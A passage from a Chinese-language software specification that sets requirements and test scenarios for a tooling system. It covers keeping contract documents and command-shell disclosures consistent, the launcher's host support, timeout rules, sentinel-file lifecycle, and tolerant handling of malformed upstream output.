与 `core/contracts/hooks/**` 契约文档)对**机制存在性**的声称 SHALL 与实现事实一致:

- 声称「随消息下发/透传」的数据 SHALL 有真实搭载通道(模板占位符或三元组槽位);未接线的
  机制 SHALL 明示披露为未生效(如「收窄当前不下发:不进入评审单元的任务消息」),SHALL NOT
  声称透传/收窄已生效——契约文档与壳的披露 SHALL 互相一致,SHALL NOT 出现契约称透传、壳称
  不下发的矛盾。
- 宿主/入口能力声称 SHALL 与实现的支持面一致:launcher 的宿主支持面(opencode|claude)在
  dsh 面被引用时 SHALL 附支持面披露(dsh-only 部署直接走壳内路径),SHALL NOT 把不支持的
  宿主组合标为「首选」。
- 同一规范在三面镜像中的措辞 SHALL 语义一致且采用完整规范形(约束层级逐条可辨,如超时
  不变式的 budget/call/stall 三层),SHALL NOT 以压缩括号注形引入绑定歧义;agent 定义等静态
  分发文件 SHALL NOT 含运行时永不替换的字面模板占位符。
- 契约文档的 producer/lifecycle 描述 SHALL 覆盖全部域的实际写入器(含 sdr 域哨兵的确定性
  写入生命周期:预武装 → 协同细化 → 确定性重写 → 中途存在性校验),字段清单 SHALL 与脚本
  实际产出的字段集一致(pending[]、stdout 摘要、manifest counts 三处),SHALL NOT 含
  「写入器尚未落地」类过时表述。

#### Scenario: 壳与契约对 --dimensions 的口径一致

- **WHEN** 读者对照三面壳的 `--dimensions` 披露与 sdr 流水线契约文档的对应段
- **THEN** 两处均如实陈述「收窄经闭集校验与 manifest 记录,当前不进入评审单元的任务消息」;
  不存在「契约称透传」的矛盾表述

#### Scenario: dsh 面对 launcher 的能力披露

- **WHEN** dsh-only 部署(无 opencode/claude CLI)的读者按 SKILL 指引考虑 launcher 入口
- **THEN** SKILL 明示 launcher 仅能 spawn opencode/claude 宿主,dsh-only 部署直接走壳内
  编排路径(NEVER 把不可用组合标为首选而使用户在 host gate 处早退)

#### Scenario: 三面超时规范同形

- **WHEN** 对照三面命令壳的超时不变式段
- **THEN** 三面均为完整规范形(budget/call/stall 三层约束逐条可辨、宿主具体数值位于调用
  占位符);agent 定义中不存在运行时永不替换的字面 `{{ }}` 占位符

#### Scenario: hooks 契约覆盖 sdr 哨兵生命周期

- **WHEN** 读者仅凭 hooks 运行时契约文档理解 sdr 域哨兵的写入与校验
- **THEN** 文档给出与实现一致的确定性写入生命周期(预武装、协同细化、重写、存在性校验)
  与全部写入器清单;NEVER 得出「哨兵由编排器临时命令写入」或「确定性写入器尚未落地」的
  相反结论

### Requirement: launcher 异常路径卫生与上游产物消费防护

launcher(`mgh_sdr_launch.py`)SHALL:

- **上游 stdout 消费防护**:对子步骤脚本(`sdr_context.py` 等)的 stdout JSON 消费 SHALL
  容错——输出缺失/错形/类型不符 SHALL 转为该分支的 FAILED 记录(stderr 给原因,多分支清单
  继续后续分支,退出码语义不变),SHALL NEVER 以裸 traceback 崩溃;失败路径 SHALL NOT 留下
  「既非成功也非记录失败」的静默态(此时已写入的运行域哨兵 SHALL 被移除或按哨兵生命周期
  契约可被恢复工具检出自愈)。
- **哨兵移除路径的诚实性**:正常完成路径移除运行域哨兵;异常/中断路径的哨兵残留 SHALL 是
  可被恢复工具检出的状态(恢复入口的存在性校验给出重武装 recipe)——launcher SHALL NOT
  以「无论成败一律移除哨兵」的方式使**仍在运行的宿主 run** 失去运行域守卫;死代码外壳
  SHALL 清理(行为与既有语义一致,NEVER 借卫生之名改变哨兵生存语义)。

#### Scenario: 上游输出错形记分支失败而非崩溃

- **WHEN** 多分支 run 中某分支的 `sdr_context` stdout 为空或非 JSON
- **THEN** launcher 将该分支记 FAILED(stderr 原因:上游产物不可解析),后续分支照常执行,
  最终退出码 1;NEVER 以 traceback 中断整个清单

#### Scenario: 异常残留哨兵可自愈

- **WHEN** run 因中断残留运行域哨兵,用户随后调用恢复入口
- **THEN** 恢复入口的存在性校验检出哨兵状态并给出重武装/清理 recipe;launcher 侧无空壳
  死代码,正常路径哨兵照常移除
